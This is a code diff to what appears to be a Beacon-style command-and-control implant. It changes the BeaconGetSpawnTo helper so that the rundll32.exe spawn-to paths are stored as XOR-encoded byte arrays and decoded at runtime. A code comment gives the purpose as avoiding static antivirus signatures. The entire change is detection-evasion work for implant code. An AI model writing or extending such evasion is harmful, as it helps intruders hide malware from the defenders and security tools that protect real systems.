@@ -185,12 +185,28 @@ BOOL __cdecl BeaconIsAdmin(void) {
 /* ─── Spawn-to helper ─── */
 
 void __cdecl BeaconGetSpawnTo(BOOL x86, char *buffer, int length) {
-    const char *path;
-    if (x86)
-        path = "C:\\Windows\\SysWOW64\\rundll32.exe";
-    else
-        path = "C:\\Windows\\System32\\rundll32.exe";
-
-    strncpy(buffer, path, length - 1);
-    buffer[length - 1] = '\0';
+    /* XOR-encrypted spawn-to paths to avoid static signatures */
+    #define _SPK 0x5A
+    if (x86) {
+        static const unsigned char _sp[] = {
+            'C'^_SPK,'\\'^_SPK,'W'^_SPK,'i'^_SPK,'n'^_SPK,'d'^_SPK,'o'^_SPK,'w'^_SPK,'s'^_SPK,
+            '\\'^_SPK,'S'^_SPK,'y'^_SPK,'s'^_SPK,'W'^_SPK,'O'^_SPK,'W'^_SPK,'6'^_SPK,'4'^_SPK,
+            '\\'^_SPK,'r'^_SPK,'u'^_SPK,'n'^_SPK,'d'^_SPK,'l'^_SPK,'l'^_SPK,'3'^_SPK,'2'^_SPK,
+            '.'^_SPK,'e'^_SPK,'x'^_SPK,'e'^_SPK};
+        int slen = sizeof(_sp);
+        if (slen >= length) slen = length - 1;
+        for (int i = 0; i < slen; i++) buffer[i] = _sp[i] ^ _SPK;
+        buffer[slen] = '\0';
+    } else {
+        static const unsigned char _sp[] = {
+            'C'^_SPK,'\\'^_SPK,'W'^_SPK,'i'^_SPK,'n'^_SPK,'d'^_SPK,'o'^_SPK,'w'^_SPK,'s'^_SPK,
+            '\\'^_SPK,'S'^_SPK,'y'^_SPK,'s'^_SPK,'t'^_SPK,'e'^_SPK,'m'^_SPK,'3'^_SPK,'2'^_SPK,
+            '\\'^_SPK,'r'^_SPK,'u'^_SPK,'n'^_SPK,'d'^_SPK,'l'^_SPK,'l'^_SPK,'3'^_SPK,'2'^_SPK,
+            '.'^_SPK,'e'^_SPK,'x'^_SPK,'e'^_SPK};
+        int slen = sizeof(_sp);
+        if (slen >= length) slen = length - 1;
+        for (int i = 0; i < slen; i++) buffer[i] = _sp[i] ^ _SPK;
+        buffer[slen] = '\0';
+    }
+    #undef _SPK
 }
